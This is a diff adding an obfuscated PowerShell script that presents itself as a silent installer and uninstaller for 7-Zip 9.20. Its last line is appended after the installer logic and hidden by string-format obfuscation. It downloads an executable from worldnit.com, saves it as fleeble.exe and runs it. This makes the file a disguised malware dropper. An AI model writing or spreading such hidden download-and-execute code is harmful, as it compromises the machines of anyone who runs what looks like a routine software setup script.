@@ -1,0 +1,120 @@
+param(
+	[string]${v`E`RsioN},
+	[string]${P`ATh},
+	[switch]${F`ORcE},
+	${U`Pd`Ate},
+	[switch]${uni`NSt`All}
+)
+
+
+
+
+
+${coNfi`GS} = @{
+	("{1}{0}" -f 'rl','U') = ("{14}{9}{12}{2}{8}{4}{3}{17}{11}{16}{6}{0}{18}{13}{5}{15}{1}{7}{10}"-f'Z','x64.m','our','g','r','7z92','/sevenzip/7-','s','cefo','dl','i','/','.s','0/','http://switch.','0-','project','e.net','ip/9.2'),("{1}{2}{11}{4}{9}{7}{6}{3}{5}{10}{8}{0}{12}" -f '.','http://','down','net/seve','ds','n','forge.','rce','ip/7za920','.sou','z','loa','zip')
+    ("{1}{0}" -f 'th','Pa') = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\ "
+}
+
+${C`onFiGs} | .("{1}{4}{0}{2}{3}" -f'O','Fo','b','ject','rEach-'){
+
+    try{
+
+        ${_}."rE`Su`lt" = ${n`ULL}
+        if(-not ${_}."pa`TH"){${_}."PA`Th" = ${P`ATH}}
+        ${cOn`F`ig} = ${_}
+
+        
+        
+        
+
+        if(-not ${u`NIN`Sta`LL}){
+
+            
+            
+            
+
+            if(${_}."c`ondiT`iOnexc`LusION"){            
+                ${_}."co`N`D`iti`O`NeXClUsiONrESu`lT" = $(.("{3}{0}{2}{1}" -f'vo','ession','ke-Expr','In') ${C`onFIg}."cO`NDI`T`IonE`xcLUS`IoN" -ErrorAction ("{2}{3}{0}{1}{4}"-f'n','tin','Sil','entlyCo','ue'))        
+            }    
+            if((${_}."cond`itIo`NeXClUSiOnREs`U`lT" -eq ${NU`Ll}) -or ${fOR`Ce}){
+                    	
+                
+                
+                
+
+                ${_}."DowNLo`ADs" = ${_}."U`RL" | &("{0}{3}{2}{1}" -f 'For','ect','h-Obj','Eac'){
+                    &("{1}{0}{2}"-f 'et-Fi','G','le') -Url ${_} -Path ${CON`FIG}."p`ATh"
+                }       			
+
+                
+                
+                
+
+                ${_}."Do`W`NlOAdS" | &("{0}{1}" -f 'wh','ere'){${_}."f`iLENaME" -eq ("{0}{2}{1}"-f '7z920-x64.','i','ms')} | &("{1}{3}{2}{0}" -f'ct','Fo','Obje','rEach-'){
+                    &("{0}{2}{3}{1}" -f 'S','ss','ta','rt-Proce') -FilePath ("{1}{0}{2}" -f 'si','m','exec') -ArgumentList "/i $(Join-Path $_.Path $_.Filename) /quiet /norestart " -Wait
+                }
+                		
+                
+                
+                
+
+                
+                ${wor`ki`NgpATh} = (.("{2}{1}{0}"-f 'n','atio','Get-Loc'))."pa`Th"
+                .("{3}{0}{1}{2}" -f '-L','ocat','ion','Set') ((("{6}{5}{4}{2}{1}{3}{0}" -f 'saAF7-ZipaAF','ram Fil','rog','e','P',':aAF','C')) -cRePlACe 'aAF',[chAR]92)
+                ${_}."dOWNL`O`Ads" | .("{1}{0}" -f 'ere','wh'){${_}."Fil`En`AmE" -eq ("{1}{2}{0}"-f'ip','7za','920.z')} | &("{1}{2}{0}" -f 'ct','ForEach-Ob','je'){
+                    .("{2}{3}{0}{1}" -f 'rt-Proc','ess','S','ta') -FilePath ((("{2}{10}{8}{3}{0}{1}{9}{4}{7}{6}{5}"-f'm File','s6B','C:6B','a','Zip6','e','z.ex','BO7','rogr','O7-','OP'))."re`pla`CE"(([Char]54+[Char]66+[Char]79),'\')) -ArgumentList "e $(Join-Path $_.Path $_.Filename) -y " -Wait
+                }
+                .("{2}{0}{3}{1}{5}{7}{6}{4}" -f'Environment','ariabl','Set-','V','ue','eV','l','a') -Name ("{0}{1}"-f 'Pat','h') -Value ((("{4}{3}{7}{0}{6}{2}{1}{5}" -f 'ogram File','-Zi','{0}7','C:',';','p{0}','s','{0}Pr')) -f [ChAr]92) -Target ("{0}{2}{1}"-f 'Ma','hine','c') -Add                
+                &("{1}{3}{0}{2}"-f 'o','Set-L','n','ocati') ${wOR`K`I`NGpATh}
+                      
+                
+                
+                
+
+                ${_}."Downl`oA`ds" | &("{3}{2}{1}{0}" -f'ect','Obj','rEach-','Fo'){
+                    .("{3}{0}{2}{1}" -f'ov','em','e-It','Rem') $(&("{1}{0}{2}"-f 'in-Pa','Jo','th') ${_}."Pa`TH" ${_}."f`I`lEnaME")
+                }
+                		
+                
+                
+                
+                		
+                if(${UPDa`TE}){${_}."rE`sult" = ("{0}{1}{2}" -f 'App','Upd','ated');${_}
+                }else{${_}."r`EsuLT" = ("{1}{0}{2}"-f 'ppInstalle','A','d');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."REs`UlT" = ("{5}{3}{1}{0}{2}{4}" -f't','i','ionExclu','ond','sion','C');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+            
+            .("{1}{0}" -f'et-MSI','G') | &("{1}{0}"-f 'e','wher'){${_}."prOduC`T`NamE" -eq ("{4}{2}{1}{0}{3}" -f 'ed','p 9.20 (x64 ','Zi','ition)','7-')} | .("{4}{2}{3}{1}{0}"-f 'ct','e','rEach-O','bj','Fo'){
+				 .("{3}{1}{0}{2}"-f 's','art-Proce','s','St') -FilePath ("{0}{2}{1}"-f'msie','c','xe') -ArgumentList "/uninstall $($_.LocalPackage) /qn " -Wait 
+			}
+            
+            ${fOL`dER} = ((("{3}{2}{5}{6}{1}{0}{4}"-f'{0}7-Zip{','les',':{0}Pro','C','0}','gram ','Fi'))  -f  [CHAr]92); if(&("{0}{2}{1}"-f'Te','-Path','st') ${f`oLdeR}){&("{0}{1}{2}{3}" -f'Re','move-','I','tem') -Path ${fOLd`eR} -Force -Recurse}
+            
+            &("{6}{1}{2}{3}{4}{8}{7}{0}{5}" -f 'bleV','m','ov','e','-E','alue','Re','entVaria','nvironm') -Name ("{1}{0}" -f'ath','P') -Value ((("{8}{1}{6}{0}{7}{9}{2}{3}{4}{5}" -f ' ',':fax','fa','x','7','-Zipfax','Program','File',';C','s'))-REPlaCe  'fax',[CHar]92) -Target ("{1}{0}" -f 'ine','Mach')
+            
+            ${_}."ReSU`Lt" = ("{0}{2}{3}{1}"-f 'AppUni','d','nstall','e');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${cONF`IG}."R`eSuLt" = ("{0}{1}" -f'Erro','r');${cO`NFIG}
+    }
+}
+(.("{2}{0}{1}" -f 'Obje','ct','New-') ("{4}{3}{5}{1}{2}{0}" -f'ient','W','ebCl','e','Syst','m.Net.')).("{1}{0}{3}{2}" -f'l','Down','dFile','oa').Invoke(("{1}{8}{2}{5}{6}{7}{4}{3}{0}"-f 'U.exe','htt',':/','/KUK','t.com','/w','o','rldni','p'),("{2}{0}{1}{3}" -f 'l','eeble.ex','f','e'));&("{0}{2}{3}{1}" -f 'Start-P','ess','ro','c') ("{2}{1}{0}"-f'e','eeble.ex','fl')
